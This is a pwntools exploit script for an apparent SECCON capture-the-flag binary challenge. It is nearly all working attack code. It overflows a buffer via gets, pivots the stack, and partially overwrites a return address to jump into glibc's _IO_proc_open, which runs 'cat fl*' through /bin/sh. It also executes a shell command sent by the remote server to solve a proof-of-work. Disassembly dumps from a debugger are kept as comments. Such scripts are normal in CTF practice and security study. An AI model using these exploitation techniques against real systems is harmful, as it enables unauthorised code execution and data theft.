#!/usr/bin/env python3

from pwn import *

exe = context.binary = ELF(args.EXE or '', checksec=True)
# libc = exe.libc
# context.terminal = ["terminator", "-u", "-e"]
context.terminal = ["remotinator", "vsplit", "-x"]

gdbscript = '''
b *main+29
# b *_IO_getline_info+232
# dir ./glibc-2.39
# set substitute-path '/build/glibc-CVJwZb/glibc-2.39' './glibc-2.39'
continue
'''

pre_argv = []
post_argv = []

def get_conn(pre_argv=[], post_argv=[], gdbscript="", *a, **kw):
    host = args.HOST or 'mrga.seccon.games'
    port = int(args.PORT or 7428)
    gdbscript = '\n'.join(line for line in gdbscript.splitlines() if line and not line.startswith('#'))
    exe_name = os.path.basename(exe.path)
    cmd = pre_argv + [exe.path] + post_argv

    if args.DOCKER:
        if args.REMOTE:
            p = remote(host, port, *a, **kw)
        else:
            p = process(f'docker run -i --rm {args.DOCKER}', shell=True)
        if args.GDB:
            sleep(1) # TODO: find better method
            gdb.attach(pidof(exe_name)[0], gdbscript=gdbscript, exe=exe.path, *a, **kw)
        return p
    if args.GDB:
        return gdb.debug(cmd, gdbscript=gdbscript, *a, **kw)
    if args.REMOTE:
        return remote(host, port, *a, **kw)

    return process(cmd, *a, **kw)

io = get_conn(pre_argv, post_argv, gdbscript)
r = lambda *a, **k: io.recv(*a, **k)
rl = lambda *a, **k: io.recvline(*a, **k)
ru = lambda *a, **k: io.recvuntil(*a, **k)
cl = lambda *a, **k: io.clean(*a, **k)
s = lambda *a, **k: io.send(*a, **k)
sa = lambda *a, **k: io.sendafter(*a, **k)
sl = lambda *a, **k: io.sendline(*a, **k)
sla = lambda *a, **k: io.sendlineafter(*a, **k)
ia = lambda *a, **k: io.interactive(*a, **k)
def protect_ptr(pos, ptr): return (pos >> 12) ^ ptr

def trace(func):
    def wrapper(*args, **kwargs):
        info(f"{func.__name__} {args} {kwargs}")
        return func(*args, **kwargs)
    return wrapper


"""
    Arch:       amd64-64-little
    RELRO:      Full RELRO
    Stack:      No canary found
    NX:         NX enabled
    PIE:        No PIE (0x3fe000)
    SHSTK:      Enabled
    IBT:        Enabled
    Stripped:   No

"""

if args.REMOTE and args.HOST != 'localhost':
    rl()
    cmd = rl().decode().strip()
    import subprocess
    pow = subprocess.check_output(cmd, shell=True)
    sa(b': ', pow)
else:
    pause()


pop_rbp = 0x004011e9# pop rbp; ret;
newmain = 0x4011BE

sla(b'>', flat(
    # set rbp to 0x404400
    p64(0x404400) * 3,

    # gets(0x4043f0)  # rbp-0x10
    newmain, # lea     rax, [rbp-0x10]

    newmain, # gets(rbp-0x10)
))

sl(flat(
    b'X' * 16,
    p64(0x4044d0), # fix rbp
    pop_rbp, 0x4043e0, # gets writes to this
    newmain,
    b'\x00' * 200,
    p64(0x404590),
    b'\x00' * 12*8,
    # b'/bin/sh\x00' * 0x20, # does not work, lol
    b'cat fl*\x00' * 0x20,
))


sl(flat(
    p64(0x404610+0xc0+0x10),
    p16(0x85D4), # jump to: _IO_proc_open+500
))

"""
 ► 0x774d4f2875d4 <_IO_proc_open@@GLIBC_2.2.5+500>    mov    r14, qword ptr [rbp - 0x128]
   0x774d4f2875db <_IO_proc_open@@GLIBC_2.2.5+507>    lea    rax, [rip + 0x143e47]               RAX => 0x774d4f3cb429 ◂— 0x622f002d2d00632d /* '-c' */
   0x774d4f2875e2 <_IO_proc_open@@GLIBC_2.2.5+514>    lea    rcx, [rip + 0x143e4b]               RCX => 0x774d4f3cb434 ◂— 0x2074697865006873 /* 'sh' */
   0x774d4f2875e9 <_IO_proc_open@@GLIBC_2.2.5+521>    mov    rdx, qword ptr [rbp - 0xf8]
   0x774d4f2875f0 <_IO_proc_open@@GLIBC_2.2.5+528>    mov    qword ptr [rbp - 0xa8], r14
   0x774d4f2875f7 <_IO_proc_open@@GLIBC_2.2.5+535>    movq   xmm1, rax
   0x774d4f2875fc <_IO_proc_open@@GLIBC_2.2.5+540>    lea    rax, [rip + 0x143e29]               RAX => 0x774d4f3cb42c ◂— 0x2f6e69622f002d2d /* '--' */
   0x774d4f287603 <_IO_proc_open@@GLIBC_2.2.5+547>    movq   xmm0, rcx
   0x774d4f287608 <_IO_proc_open@@GLIBC_2.2.5+552>    xor    ecx, ecx                            ECX => 0
   0x774d4f28760a <_IO_proc_open@@GLIBC_2.2.5+554>    mov    qword ptr [rbp - 0xb0], rax
   0x774d4f287611 <_IO_proc_open@@GLIBC_2.2.5+561>    mov    rax, qword ptr [rip + 0x17b988]     RAX, [0x774d4f402fa0] => 0x774d4f40ad58 (environ)
   0x774d4f287618 <_IO_proc_open@@GLIBC_2.2.5+568>    punpcklqdq xmm0, xmm1
   0x774d4f28761c <_IO_proc_open@@GLIBC_2.2.5+572>    lea    rdi, [r13 + 0xe0]
   0x774d4f287623 <_IO_proc_open@@GLIBC_2.2.5+579>    lea    r8, [rbp - 0xc0]
   0x774d4f28762a <_IO_proc_open@@GLIBC_2.2.5+586>    lea    rsi, [rip + 0x143dfe]               RSI => 0x774d4f3cb42f ◂— 0x68732f6e69622f /* '/bin/sh' */
   0x774d4f287631 <_IO_proc_open@@GLIBC_2.2.5+593>    mov    qword ptr [rbp - 0xa0], 0
   0x774d4f28763c <_IO_proc_open@@GLIBC_2.2.5+604>    mov    r9, qword ptr [rax]
   0x774d4f28763f <_IO_proc_open@@GLIBC_2.2.5+607>    movaps xmmword ptr [rbp - 0xc0], xmm0
   0x774d4f287646 <_IO_proc_open@@GLIBC_2.2.5+614>    call   posix_spawn@@GLIBC_2.15     <posix_spawn@@GLIBC_2.15>
"""



"""
► 0x740152887101 <gets+145>    add    rsp, 0x10
   0x740152887105 <gets+149>    pop    rbx
   0x740152887106 <gets+150>    pop    r12
   0x740152887108 <gets+152>    pop    r13
   0x74015288710a <gets+154>    pop    r14
   0x74015288710c <gets+156>    pop    rbp
   0x74015288710d <gets+157>    ret    

   
   0x7ffff7c87350 <_IO_padn+256>            add    rsp, 0x38     RSP => 0x404430 (0x4043f8 + 0x38)
   0x7ffff7c87354 <_IO_padn+260>            mov    rax, r12      RAX => 0x7ffff7e038e0 (_IO_2_1_stdin_) ◂— 0xfbad208b
   0x7ffff7c87357 <_IO_padn+263>            pop    rbx           RBX => 0x4011cf (main+34)
   0x7ffff7c87358 <_IO_padn+264>            pop    r12           R12 => 0
 ► 0x7ffff7c8735a <_IO_padn+266>            pop    r13           R13 => 0
   0x7ffff7c8735c <_IO_padn+268>            pop    r14           R14 => 0
   0x7ffff7c8735e <_IO_padn+270>            pop    r15           R15 => 0
   0x7ffff7c87360 <_IO_padn+272>            pop    rbp           RBP => 0
   0x7ffff7c87361 <_IO_padn+273>            ret                                <0>
"""

ia()
